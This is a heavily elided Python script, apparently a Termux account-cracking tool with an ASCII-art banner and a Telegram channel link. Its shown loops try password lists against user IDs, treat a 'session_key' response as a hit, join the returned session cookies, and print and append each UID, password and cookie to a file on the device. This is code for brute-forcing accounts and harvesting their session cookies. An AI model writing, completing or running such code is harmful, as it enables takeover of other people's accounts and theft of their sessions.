...
▐▌  ▐▌▗▄█▄▖▐▙▄▄▖▝▚▄▞▘ ▐▌  
                          ...
                          \n[red1]{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]ASRAFUL\n     [red1]✗ [light_green]Status   
	[red1]✗ [chartreuse1]GIVE BY ➤ [orange3]▶
 [orange3]▶  [medium_purple1][r]https://t.me/NILOY_TERMUX_TEAM[/r]\n[red1]{sort.line()}'''
        print(aci)
...
def info():
    sort.clear()
    print('     [b]    [red1] WELCOME TO NILOY GIVE TOOL          ')
    time.sleep(4)
    sort.clear()
    ...
    try:
        ...
        for pw in pwx:
            ...
            if "session_key" in po:
                ...
                print(f"\r\r[reverse white][ASRAFUL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if "session_key" in po:
                ...
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][ASRAFUL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/ASRAFUL_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                uid=po["uid"]
